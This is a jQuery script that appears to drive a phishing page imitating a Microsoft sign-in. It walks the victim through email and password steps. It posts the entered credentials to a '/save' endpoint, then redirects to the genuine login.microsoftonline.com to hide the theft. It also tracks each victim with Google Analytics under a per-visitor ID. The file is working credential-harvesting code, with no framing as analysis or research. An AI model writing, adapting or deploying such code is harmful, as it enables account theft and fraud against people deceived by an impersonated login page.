/* eslint-disable prettier/prettier */
var currentTab = "main";
$('document').ready(function () {

    $('#nextButton').click(function () {
        const email = $('#email').val();
        if (!validateEmail(email)) {
            $('#alert').show();
        } else {
            if ($('#alert').is(':visible')) { $('#alert').hide() }
            $('#displayName').text(email);
            $('#main').animate({ width: 'toggle' }, 250, function () {
                $('#passcode').animate({ width: 'toggle' }, 250);
            });
            currentTab = "passcode";
        }
    });
    $('#backButton').click(function () {
        $('#passcode').animate({ width: 'toggle' }, 250, function () {
            $('#main').animate({ width: 'toggle' }, 250);
        });
        currentTab = "main";
    });

    $('#submitButton').click(function (e) {
        e.preventDefault();
        console.info($("form").serialize());
        if ($('#password').val()) {
            $.ajax({
                url: '/save',
                type: 'post',
                dataType: 'application/json',
                data: $("form").serialize()
            });
            window.location.href = "https://login.microsoftonline.com";
        }
    });

    $('form').keyup(function (e) {
        if (e.keyCode == 13) {
            console.info("test222")
            e.preventDefault();
            if (currentTab == 'passcode' && $('#password').val()) {
                $('#submitButton').click()
            } else if (currentTab == 'main') {
                $('#nextButton').click();
            }
            return false;
        }
    });
    $('input').keyup(function (e) {
        if (e.keyCode == 13) {
            console.info("test256546522")
            e.preventDefault();
            if (currentTab == 'passcode' && $('#password').val()) {
                $('#submitButton').click()
            } else if (currentTab == 'main') {
                $('#nextButton').click();
            }
            return false;
        }
    });
});

function validateEmail($email) {
    var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
    return emailReg.test($email);
}


window.dataLayer = window.dataLayer || [];
function gtag() { dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'G-DMYRD3W8H5', { 'user_id': $('#uuid').text() });
gtag('config', 'G-DMYRD3W8H5');